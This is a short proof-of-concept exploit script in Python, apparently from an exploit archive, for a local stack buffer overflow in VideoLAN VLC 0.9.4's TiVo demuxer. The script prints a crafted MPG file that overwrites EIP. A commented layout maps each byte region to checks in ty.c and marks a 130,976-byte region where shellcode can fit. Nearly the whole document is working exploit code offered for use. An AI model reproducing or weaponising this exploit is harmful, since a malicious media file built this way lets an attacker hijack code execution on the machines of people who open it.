"""
Full title:	VideoLAN VLC Media Player 0.9.4 TIVO Local Stack Buffer Overflow PoC
Exploit Author:	Paolo Stagno - voidsec@voidsec.com (Based on the original work of Guido Landi)
Vendor Homepage:	https://www.videolan.org
Version:	VideoLAN VLC Media Player 0.9.4
Tested on:	Windows 7
Category:	local exploits
Platform:	windows
Usage:	redirect the output of this script into an MPG file, load it into VLC 0.9.4, the EIP will be overwritten with \x41\x41\x41\x41
"""

#!/usr/bin/python
EIP = "AAAA";
junk = "\x90";

print "\xF5\x46\x7A\xBD" + "\x00\x00\x00\x02" + "\x00\x02\x00\x00" + (junk * 8) + "\x00\x00\x05\x41" + (junk * 4) + "\x00\x00\x05\x49" + (junk * 60) + EIP + (junk * 130976) + "\x05" + (junk * 3) + "\x05" + (junk * 1) + "\x09" + "\xc0" + (junk * 14) + "\x06" + "\xe0" + (junk * 531062)

"""
--------------------------------------------------------
|		ty.c #112 TIVO_PES_FILEID 0xf5467abd				| 
--------------------------------------------------------
|		ty.c #113 TIVO_PART_LENGTH 0x20000000			|
--------------------------------------------------------
|		ty.c #114 CHUNK_SIZE	128 * 1024						|
--------------------------------------------------------
|		junk * 8															|
--------------------------------------------------------
|		i_map_size														|
--------------------------------------------------------
|		junk * 4															|
--------------------------------------------------------
|		ty.c # 1654 i_seq_table_size/(8+i_map_size)== 1	|
--------------------------------------------------------
|		junk * 60														|
--------------------------------------------------------
|		EIP																|
--------------------------------------------------------
|		big junk * 130976  (shellcode can fit here )			|
--------------------------------------------------------
|		ty.c #1743 i_num_recs must be greater than 5		|
--------------------------------------------------------
|		junk * 3															|
--------------------------------------------------------
|		p_hdrs (x05)													|
--------------------------------------------------------
|		junk * 1															|
--------------------------------------------------------
|		ty.c #1763 rec_type == 0x9c0 -> AC-3DTivo		|
|		subrec_type	(x09)											|
|		rec_type (xc0)												|
--------------------------------------------------------
|		junk * 14														|
--------------------------------------------------------
|		video type rec_type == 0x6e0 -> S1 Tivo				|
|		subrec_type (x06)											|
|		rec_type (xe0)												|
--------------------------------------------------------
|		big junk x 531062												|
--------------------------------------------------------
"""